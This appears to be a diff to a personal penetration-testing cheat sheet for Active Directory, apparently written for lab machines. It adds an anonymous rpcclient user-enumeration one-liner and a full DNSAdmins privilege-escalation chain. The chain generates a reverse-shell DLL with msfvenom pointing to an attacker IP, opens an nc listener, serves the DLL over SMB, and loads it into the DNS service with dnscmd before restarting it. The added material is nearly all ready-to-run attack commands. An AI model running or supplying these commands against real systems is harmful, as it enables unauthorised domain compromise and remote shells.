@@ -21,10 +21,17 @@ rdate -n 10.10.10.52
 string | sed 's/^ *//' | awk '{print $2}' FS=">" | cut -d '<' -f 1 | awk {print $1$2}
 string | sed 's/^ *//' | awk '{print $2}' FS=">" | cut -d '<' -f 1 | awk {print substr($1,1,1),$2}
 ```
+Hidden files
+```
+dir C:\ -Force
+```
 
 ### RPC
 https://www.hackingarticles.in/active-directory-enumeration-rpcclient/ \
 https://raw.githubusercontent.com/s4vitar/rpcenum/master/rpcenum
+```
+rpcclient -U '' 10.10.10.169 -c "enumdomusers" -N | grep -oP '\[.*?\]' | grep -v -E '0x|DefaultAcoount|Guest' | sort -u | tr -d '[]' > users.txt
+```
 ```
 ./rpcenum -e DUsers -i IP
 ./rpcenum -e DAUsers -i IP
@@ -443,11 +450,38 @@ Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Crede
 
 ### Priv escalation – DNSAdmins
 https://www.youtube.com/watch?v=LiIqn-l2Stg&list=PLziMzyAZFGMf8rGjtpV6gYbx5hozUNeSZ&index=84&ab_channel=I.T%26Security
+https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/
 
-#DNSAdmins
+#Configure DNSAdmins
 ```
 net localgroup "DnsAdmins" user /add
 ```
+#Exploit
+```
+net user <user>
+net group <group>
+net localgroup
+net localgroup DnsAdmins
+```
+```
+whoami /all
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.211.55.13 LPORT=4444 --platform=windows -f dll > ~/windows/privesc/plugin.dll
+nc -nvlp 4444
+```
+```
+impacket-smbserver folder . -smb2support
+```
+```
+#Importing the plugin:
+dnscmd.exe myserver.local /config /serverlevelplugindll \\10.211.55.13\share\plugin.dll
+dnscmd.exe /config /serverlevelplugindll \\10.211.55.13\share\plugin.dll
+```
+```
+#Restarting the service:
+sc.exe stop dns
+sc.exe start dns
+```
+
 ### Priv escalation -  Dcsync
 https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
 
